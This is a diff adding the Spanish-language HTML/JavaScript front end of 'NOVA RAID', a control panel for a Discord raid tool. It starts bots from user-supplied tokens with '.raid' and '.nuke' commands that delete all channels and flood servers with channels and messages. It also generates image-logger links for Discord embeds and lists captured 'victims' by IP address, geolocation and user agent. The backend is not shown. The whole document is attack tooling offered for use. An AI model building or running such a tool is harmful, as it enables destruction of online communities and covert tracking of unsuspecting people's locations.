@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOVA RAID | TERMINAL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(255, 0, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 0, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glass-panel {
+            background: rgba(10, 10, 15, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .cyber-input {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #ff0000;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s;
+        }
+
+        .cyber-input:focus {
+            border-color: #ff4444;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            outline: none;
+        }
+
+        .cyber-button {
+            background: linear-gradient(135deg, #ff0000, #990000);
+            border: none;
+            color: white;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .cyber-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px #ff0000;
+        }
+
+        .cyber-tab {
+            background: rgba(20, 0, 0, 0.3);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            color: rgba(255, 255, 255, 0.5);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .cyber-tab:hover {
+            color: white;
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+        }
+
+        .cyber-tab.active {
+            background: rgba(255, 0, 0, 0.2);
+            border-color: #ff0000;
+            color: white;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .server-card {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .server-card:hover {
+            border-color: #ff0000;
+            transform: translateX(5px);
+            box-shadow: -5px 0 20px rgba(255, 0, 0, 0.2);
+        }
+
+        .ip-log {
+            background: rgba(0, 0, 0, 0.7);
+            border-left: 3px solid #ff0000;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        .animate-slideIn {
+            animation: slideIn 0.3s ease-out;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a0000;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            border-radius: 0;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .tab {
+            display: none;
+        }
+
+        .tab.active {
+            display: block;
+        }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+    <div class="max-w-7xl mx-auto relative z-10">
+        <!-- Header -->
+        <div class="mb-8 text-center">
+            <h1 class="text-5xl md:text-7xl font-black text-white mb-2">NOVA RAID</h1>
+            <div class="flex items-center justify-center gap-4">
+                <div class="h-[1px] w-12 bg-red-600"></div>
+                <p class="text-red-600 text-xs font-mono tracking-[0.5em] uppercase">TERMINAL v3.0</p>
+                <div class="h-[1px] w-12 bg-red-600"></div>
+            </div>
+        </div>
+
+        <!-- Pestañas -->
+        <div class="flex flex-wrap gap-2 mb-6">
+            <button class="cyber-tab active px-6 py-3" onclick="window.tab('raid',this)">🎯 RAID CONSOLE</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('servers',this)">📡 SERVER LIST</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('gen',this)">🔗 IMAGE LOGGER</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('logs',this)">👁️ IP TRACKER</button>
+            <button class="cyber-tab px-6 py-3" onclick="window.tab('active',this)">⚡ ACTIVE BOTS</button>
+        </div>
+
+        <!-- RAID CONSOLE -->
+        <div id="raid" class="tab active">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-xs text-red-600 font-mono block mb-2">> BOT_TOKEN</label>
+                            <input type="password" id="rToken" class="cyber-input w-full p-4 rounded" placeholder="INGRESA EL TOKEN">
+                        </div>
+                        <div>
+                            <label class="text-xs text-red-600 font-mono block mb-2">> PREFIJO (opcional)</label>
+                            <input type="text" id="rPrefix" value="." class="cyber-input w-full p-4 rounded" placeholder="PREFIJO DE COMANDOS">
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <button onclick="window.iniciarBot()" class="cyber-button w-full p-4 rounded">🤖 INICIAR BOT</button>
+                            <button onclick="window.detenerBot()" class="cyber-button w-full p-4 rounded" style="background: linear-gradient(135deg, #660000, #330000);">🛑 DETENER BOT</button>
+                        </div>
+                        <div id="botStatus" class="hidden p-4 bg-green-950/30 border border-green-900 rounded">
+                            <div class="text-green-500 text-sm font-mono">✅ BOT ACTIVO</div>
+                            <div id="botUser" class="text-gray-400 text-xs mt-2"></div>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <div class="bg-black/50 p-4 rounded">
+                            <h3 class="text-red-600 font-mono text-sm mb-4">📋 COMANDOS DISPONIBLES</h3>
+                            <div class="space-y-2 text-xs font-mono">
+                                <div><span class="text-red-500">.raid</span> - <span class="text-gray-400">Ataque completo: nuke + 50 canales + 15 mensajes</span></div>
+                                <div><span class="text-red-500">.nuke</span> - <span class="text-gray-400">Elimina todos los canales</span></div>
+                                <div><span class="text-red-500">.stop / .off</span> - <span class="text-gray-400">Detiene el bot</span></div>
+                                <div><span class="text-red-500">.servers</span> - <span class="text-gray-400">Lista servidores</span></div>
+                                <div><span class="text-red-500">.ping</span> - <span class="text-gray-400">Ver latencia</span></div>
+                                <div><span class="text-red-500">.help</span> - <span class="text-gray-400">Muestra ayuda</span></div>
+                            </div>
+                        </div>
+                        <button onclick="window.cargarServidores()" class="bg-transparent border border-red-800 hover:border-red-600 text-red-600 w-full py-4 rounded">🔍 VER SERVIDORES</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- IMAGE LOGGER MEJORADO -->
+        <div id="gen" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="space-y-4">
+                        <h3 class="text-red-600 font-mono text-sm mb-4">> SUBIR IMAGEN</h3>
+                        <div id="dropArea" class="border-2 border-dashed border-red-900/50 hover:border-red-600 rounded-lg p-8 text-center cursor-pointer" onclick="document.getElementById('imageInput').click()">
+                            <input type="file" id="imageInput" accept="image/*" class="hidden" onchange="window.previsualizarImagen(this)">
+                            <div class="text-red-600 text-4xl mb-2">📸</div>
+                            <div class="text-gray-400 text-sm font-mono">Haz clic para seleccionar imagen</div>
+                        </div>
+                        <div id="previewArea" class="hidden">
+                            <img id="imagePreview" class="w-full rounded-lg border border-red-900/50" src="" alt="Preview">
+                        </div>
+                        <button onclick="window.subirImagen()" class="cyber-button w-full p-4 rounded">📤 SUBIR IMAGEN</button>
+                    </div>
+                    <div id="generatedLinks" class="hidden space-y-4">
+                        <div class="bg-black/50 p-4 rounded">
+                            <div class="text-xs text-gray-500 mb-2">URL DEL LOGGER:</div>
+                            <div id="loggerUrl" class="text-red-400 text-xs break-all font-mono bg-black/30 p-2 rounded"></div>
+                            <button onclick="window.copiarTexto('loggerUrl')" class="mt-2 text-[10px] text-red-600 hover:text-red-400">📋 COPIAR</button>
+                        </div>
+                        <div class="bg-black/50 p-4 rounded">
+                            <div class="text-xs text-gray-500 mb-2">PARA DISCORD (embed):</div>
+                            <div id="discordUrl" class="text-red-400 text-xs break-all font-mono bg-black/30 p-2 rounded"></div>
+                            <button onclick="window.copiarTexto('discordUrl')" class="mt-2 text-[10px] text-red-600 hover:text-red-400">📋 COPIAR</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- LISTA DE IMÁGENES SUBIDAS CON URLS CLICKEABLES -->
+                <div class="mt-8">
+                    <h3 class="text-red-600 font-mono text-sm mb-4">> IMÁGENES SUBIDAS</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 max-h-96 overflow-y-auto p-2" id="imagesList">
+                        <!-- Las imágenes se cargarán aquí -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SERVER LIST -->
+        <div id="servers" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="mb-6">
+                    <h3 class="text-red-600 font-mono text-sm mb-4">> SERVIDORES_DISPONIBLES</h3>
+                    <div class="flex gap-4">
+                        <input type="password" id="sToken" placeholder="TOKEN DEL BOT" class="cyber-input flex-1 p-4 rounded">
+                        <button onclick="window.listarServidores()" class="cyber-button px-8 py-4 rounded">📡 ESCANEAR</button>
+                    </div>
+                </div>
+                <div id="serversList" class="space-y-2 max-h-96 overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- IP TRACKER -->
+        <div id="logs" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-red-600 font-mono text-sm">> VÍCTIMAS_CAPTURADAS</h3>
+                    <button onclick="window.updateLogs()" class="text-xs bg-red-950 hover:bg-red-900 text-red-400 px-4 py-2 rounded">🔄 REFRESCAR</button>
+                </div>
+                <div id="ipBox" class="space-y-2 h-96 overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- ACTIVE BOTS -->
+        <div id="active" class="tab hidden">
+            <div class="glass-panel p-6 rounded-lg">
+                <h3 class="text-red-600 font-mono text-sm mb-6">> BOTS_ACTIVOS</h3>
+                <div id="activeBotsList" class="space-y-3"></div>
+                <button onclick="window.actualizarBotsActivos()" class="mt-4 text-xs bg-transparent border border-red-800 hover:border-red-600 text-red-600 px-6 py-3 rounded">⟲ ACTUALIZAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // VARIABLES GLOBALES
+        // ============================================
+        window.imagenActual = null;
+        window.imagenesSubidas = [];
+
+        // ============================================
+        // FUNCIONES DE PESTAÑAS
+        // ============================================
+        window.tab = function(id, el) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.cyber-tab').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            if (el) el.classList.add('active');
+            
+            if (id === 'logs') window.updateLogs();
+            if (id === 'active') window.actualizarBotsActivos();
+            if (id === 'gen') window.cargarImagenes();
+        };
+
+        // ============================================
+        // FUNCIONES DEL BOT
+        // ============================================
+        window.iniciarBot = async function() {
+            const token = document.getElementById('rToken').value;
+            const prefix = document.getElementById('rPrefix').value || '.';
+            
+            if (!token) {
+                window.mostrarNotificacion('❌ ERROR', 'Token requerido');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/start-bot', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token, prefix })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    document.getElementById('botStatus').classList.remove('hidden');
+                    document.getElementById('botUser').innerText = `Bot: ${data.user}`;
+                    window.mostrarNotificacion('✅ BOT INICIADO', 'Comandos activados en Discord');
+                } else {
+                    window.mostrarNotificacion('❌ ERROR', data.error);
+                }
+            } catch (e) {
+                window.mostrarNotificacion('❌ ERROR', e.message);
+            }
+        };
+
+        window.detenerBot = async function() {
+            const token = document.getElementById('rToken').value;
+            
+            if (!token) {
+                window.mostrarNotificacion('❌ ERROR', 'Token requerido');
+                return;
+            }
+
+            const res = await fetch('/api/stop-bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token })
+            });
+            
+            const data = await res.json();
+            
+            if (data.success) {
+                document.getElementById('botStatus').classList.add('hidden');
+                window.mostrarNotificacion('✅ BOT DETENIDO', 'Desconectado correctamente');
+            } else {
+                window.mostrarNotificacion('❌ ERROR', data.message);
+            }
+        };
+
+        window.cargarServidores = async function() {
+            const token = document.getElementById('rToken').value;
+            if (!token) {
+                window.mostrarNotificacion('❌ ERROR', 'Token requerido');
+                return;
+            }
+
+            const res = await fetch('/api/get-guilds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                const select = document.getElementById('rTarget');
+                if (select) {
+                    select.innerHTML = '<option value="todos">🔥 TODOS LOS SERVIDORES</option>';
+                    data.guilds.forEach(g => {
+                        select.innerHTML += `<option value="${g.id}">${g.name} (${g.memberCount} miembros)</option>`;
+                    });
+                }
+                window.mostrarNotificacion('✅ SERVIDORES', `${data.guilds.length} servidores cargados`);
+            }
+        };
+
+        window.listarServidores = async function() {
+            const token = document.getElementById('sToken').value;
+            if (!token) {
+                window.mostrarNotificacion('❌ ERROR', 'Token requerido');
+                return;
+            }
+
+            const res = await fetch('/api/get-guilds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                const list = document.getElementById('serversList');
+                list.innerHTML = data.guilds.map(g => `
+                    <div class="server-card p-4 rounded" onclick="document.getElementById('rToken').value='${token}'; window.tab('raid', null);">
+                        <div class="font-bold text-red-500">${g.name}</div>
+                        <div class="text-gray-500 text-xs">Miembros: ${g.memberCount}</div>
+                    </div>
+                `).join('');
+            }
+        };
+
+        // ============================================
+        // IMAGE LOGGER FUNCTIONS
+        // ============================================
+        window.previsualizarImagen = function(input) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('imagePreview').src = e.target.result;
+                    document.getElementById('previewArea').classList.remove('hidden');
+                    document.getElementById('dropArea').classList.add('hidden');
+                    window.imagenActual = input.files[0];
+                };
+                reader.readAsDataURL(input.files[0]);
+            }
+        };
+
+        window.subirImagen = async function() {
+            if (!window.imagenActual) {
+                window.mostrarNotificacion('❌ ERROR', 'Selecciona una imagen');
+                return;
+            }
+
+            const btn = event.target;
+            const originalText = btn.innerText;
+            btn.innerText = '📤 SUBIENDO...';
+            
+            const formData = new FormData();
+            formData.append('image', window.imagenActual);
+
+            try {
+                const res = await fetch('/api/upload-image', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    document.getElementById('loggerUrl').innerText = data.loggerUrl;
+                    document.getElementById('discordUrl').innerText = data.discordPreview;
+                    document.getElementById('generatedLinks').classList.remove('hidden');
+                    
+                    document.getElementById('previewArea').classList.add('hidden');
+                    document.getElementById('dropArea').classList.remove('hidden');
+                    window.imagenActual = null;
+                    document.getElementById('imageInput').value = '';
+                    
+                    await window.cargarImagenes();
+                    window.mostrarNotificacion('✅ IMAGEN SUBIDA', 'Link generado');
+                }
+            } catch (e) {
+                window.mostrarNotificacion('❌ ERROR', e.message);
+            }
+            
+            btn.innerText = originalText;
+        };
+
+        window.cargarImagenes = async function() {
+            try {
+                const res = await fetch('/api/images');
+                const images = await res.json();
+                window.imagenesSubidas = images;
+                
+                const list = document.getElementById('imagesList');
+                
+                if (images.length === 0) {
+                    list.innerHTML = '<div class="text-gray-700 text-center p-8 font-mono col-span-3">📸 NO HAY IMÁGENES</div>';
+                    return;
+                }
+                
+                list.innerHTML = images.map(img => {
+                    const baseUrl = window.location.origin;
+                    const loggerUrl = `${baseUrl}${img.loggerUrl}`;
+                    const previewUrl = `${baseUrl}${img.url}`;
+                    
+                    return `
+                    <div class="bg-black/50 rounded-lg border border-red-900/30 overflow-hidden hover:border-red-600 transition-all cursor-pointer" onclick="window.mostrarInfoImagen('${img.id}', '${loggerUrl}', '${previewUrl}', '${img.originalName}', ${img.views})">
+                        <img src="${previewUrl}" class="w-full h-32 object-cover" onerror="this.src='https://via.placeholder.com/400x200?text=Error'">
+                        <div class="p-3">
+                            <div class="text-[10px] font-mono text-gray-500 truncate">${img.originalName}</div>
+                            <div class="flex justify-between items-center mt-2">
+                                <span class="text-[10px] text-red-600">👁️ ${img.views || 0} vistas</span>
+                                <span class="text-[8px] text-gray-600">${new Date(img.createdAt).toLocaleDateString()}</span>
+                            </div>
+                            <div class="mt-2 flex gap-2">
+                                <button onclick="event.stopPropagation(); window.copiarTextoDirecto('${loggerUrl}')" class="text-[8px] bg-red-950 hover:bg-red-900 text-red-400 px-2 py-1 rounded flex-1">📋 LOGGER</button>
+                                <button onclick="event.stopPropagation(); window.copiarTextoDirecto('${previewUrl}')" class="text-[8px] bg-blue-950 hover:bg-blue-900 text-blue-400 px-2 py-1 rounded flex-1">🖼️ IMAGEN</button>
+                            </div>
+                        </div>
+                    </div>
+                    `;
+                }).join('');
+                
+            } catch (e) {
+                console.error('Error cargando imágenes:', e);
+            }
+        };
+
+        window.mostrarInfoImagen = function(id, loggerUrl, previewUrl, nombre, vistas) {
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4';
+            modal.onclick = function(e) {
+                if (e.target === modal) modal.remove();
+            };
+            
+            modal.innerHTML = `
+                <div class="bg-black border-2 border-red-600 rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
+                    <div class="p-6 space-y-4">
+                        <div class="flex justify-between items-center">
+                            <h3 class="text-red-600 font-mono text-lg">📸 DETALLES DE IMAGEN</h3>
+                            <button onclick="this.closest('.fixed').remove()" class="text-gray-500 hover:text-red-600 text-xl">✕</button>
+                        </div>
+                        
+                        <img src="${previewUrl}" class="w-full h-64 object-contain bg-black/50 rounded border border-red-900/30">
+                        
+                        <div class="space-y-3">
+                            <div class="bg-black/50 p-3 rounded">
+                                <div class="text-[10px] text-gray-500 mb-1">NOMBRE:</div>
+                                <div class="text-red-400 text-sm font-mono break-all">${nombre}</div>
+                            </div>
+                            
+                            <div class="bg-black/50 p-3 rounded">
+                                <div class="text-[10px] text-gray-500 mb-1">URL LOGGER (para Discord):</div>
+                                <div class="text-red-400 text-xs font-mono break-all bg-black/30 p-2 rounded">${loggerUrl}</div>
+                                <button onclick="window.copiarTextoDirecto('${loggerUrl}')" class="mt-2 text-[10px] bg-red-950 hover:bg-red-900 text-red-400 px-3 py-1 rounded">📋 COPIAR LOGGER</button>
+                            </div>
+                            
+                            <div class="bg-black/50 p-3 rounded">
+                                <div class="text-[10px] text-gray-500 mb-1">URL DIRECTA (imagen sola):</div>
+                                <div class="text-blue-400 text-xs font-mono break-all bg-black/30 p-2 rounded">${previewUrl}</div>
+                                <button onclick="window.copiarTextoDirecto('${previewUrl}')" class="mt-2 text-[10px] bg-blue-950 hover:bg-blue-900 text-blue-400 px-3 py-1 rounded">📋 COPIAR IMAGEN</button>
+                            </div>
+                            
+                            <div class="flex justify-between text-[10px] text-gray-500">
+                                <span>🆔 ID: ${id}</span>
+                                <span>👁️ VISTAS: ${vistas}</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+        };
+
+        // ============================================
+        // IP LOGS FUNCTIONS
+        // ============================================
+        window.updateLogs = async function() {
+            try {
+                const res = await fetch('/api/ip-logs');
+                const data = await res.json();
+                const box = document.getElementById('ipBox');
+                
+                if (data.length === 0) {
+                    box.innerHTML = '<div class="text-gray-700 text-center p-8 font-mono">👁️ NO HAY VÍCTIMAS</div>';
+                    return;
+                }
+                
+                box.innerHTML = data.map(l => `
+                    <div class="ip-log p-3 rounded hover:border-red-600 transition-all">
+                        <div class="flex justify-between items-center">
+                            <span class="text-red-500 font-bold">${l.ip}</span>
+                            <span class="text-gray-600 text-[8px]">${l.date}</span>
+                        </div>
+                        <div class="text-gray-400 text-[10px] mt-1">📍 ${l.geo}</div>
+                        <div class="text-gray-700 text-[8px] mt-1 font-mono truncate">${l.ua || 'Desconocido'}</div>
+                        ${l.imageId ? `<div class="mt-1 text-[8px] text-red-900">🖼️ Image ID: ${l.imageId}</div>` : ''}
+                    </div>
+                `).join('');
+                
+            } catch (e) {}
+        };
+
+        // ============================================
+        // ACTIVE BOTS FUNCTIONS
+        // ============================================
+        window.actualizarBotsActivos = async function() {
+            try {
+                const res = await fetch('/api/active-bots');
+                const bots = await res.json();
+                const list = document.getElementById('activeBotsList');
+                
+                if (bots.length === 0) {
+                    list.innerHTML = '<div class="text-gray-700 text-center p-8 font-mono">⚡ NO HAY BOTS ACTIVOS</div>';
+                    return;
+                }
+                
+                list.innerHTML = bots.map(b => `
+                    <div class="bg-black/50 p-4 rounded border border-red-900/30">
+                        <div class="text-red-500 font-mono">${b.user}</div>
+                        <div class="text-gray-500 text-xs mt-1">Token: ${b.token}</div>
+                        <div class="text-gray-600 text-[10px] mt-1">Iniciado: ${new Date(b.startedAt).toLocaleString()}</div>
+                    </div>
+                `).join('');
+                
+            } catch (e) {}
+        };
+
+        // ============================================
+        // FUNCIONES DE UTILIDAD
+        // ============================================
+        window.copiarTexto = function(elementId) {
+            const text = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(text);
+            window.mostrarNotificacion('📋 COPIADO', 'URL en portapapeles');
+        };
+
+        window.copiarTextoDirecto = function(text) {
+            navigator.clipboard.writeText(text);
+            window.mostrarNotificacion('📋 COPIADO', 'URL en portapapeles');
+        };
+
+        window.mostrarNotificacion = function(titulo, mensaje) {
+            const notif = document.createElement('div');
+            notif.className = 'fixed top-4 right-4 bg-black border border-red-600 p-4 rounded shadow-2xl z-50 animate-slideIn';
+            notif.innerHTML = `
+                <div class="font-bold text-red-600">${titulo}</div>
+                <div class="text-xs text-gray-400 font-mono mt-1">${mensaje}</div>
+            `;
+            document.body.appendChild(notif);
+            setTimeout(() => notif.remove(), 3000);
+        };
+
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
+        document.addEventListener('DOMContentLoaded', () => {
+            window.cargarImagenes();
+            
+            // Configurar drag & drop
+            const dropArea = document.getElementById('dropArea');
+            const imageInput = document.getElementById('imageInput');
+            
+            if (dropArea) {
+                dropArea.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    dropArea.classList.add('border-red-600');
+                });
+                
+                dropArea.addEventListener('dragleave', () => {
+                    dropArea.classList.remove('border-red-600');
+                });
+                
+                dropArea.addEventListener('drop', (e) => {
+                    e.preventDefault();
+                    dropArea.classList.remove('border-red-600');
+                    
+                    const files = e.dataTransfer.files;
+                    if (files.length > 0) {
+                        imageInput.files = files;
+                        window.previsualizarImagen(imageInput);
+                    }
+                });
+            }
+        });
+
+        // Auto-refresh cada 5 segundos
+        setInterval(() => {
+            if (document.getElementById('logs').classList.contains('active')) {
+                window.updateLogs();
+            }
+            if (document.getElementById('active').classList.contains('active')) {
+                window.actualizarBotsActivos();
+            }
+            if (document.getElementById('gen').classList.contains('active')) {
+                window.cargarImagenes();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
